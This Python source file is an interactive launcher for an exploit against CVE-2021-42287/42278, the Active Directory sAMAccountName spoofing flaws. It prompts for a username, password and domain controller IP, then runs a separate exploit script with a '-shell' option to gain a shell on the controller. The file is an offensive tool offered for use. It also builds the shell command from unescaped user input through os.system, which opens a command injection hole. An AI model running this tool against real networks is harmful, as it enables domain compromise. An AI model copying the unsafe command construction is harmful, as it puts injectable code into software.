import os
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI


def CVE_2021_42287andCVE_2021_42278():
    print('\033[1;34;34m' + "[*] Please enter the necessary information as follows:" + '\033[0m')
    print('\033[1;34;34m' + "[*] usage:username password dc_ip" + '\033[0m')
    commands = ["exit"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;1;1mCVE-2021-42287/42278 > \033[0m')
    while True:
        try:
            info = prompt(formatted_text1, completer=completer)
            if info == 'exit':
                break
            elif info == "":
                continue
            else:
                command = 'python CVE_2021_42287andCVE_2021_42278_exploit.py "{}:{}" -dc-ip {} -shell'.format(info.split()[0], info.split()[1], info.split()[2])
                os.system(command)
        except KeyboardInterrupt:
            print('\033[1;1;1m' + "[-] Exiting......" + '\033[0m')
            break
        except:
            print('\033[1;31;31m' + "[-] Something error!" + '\033[0m')
            break
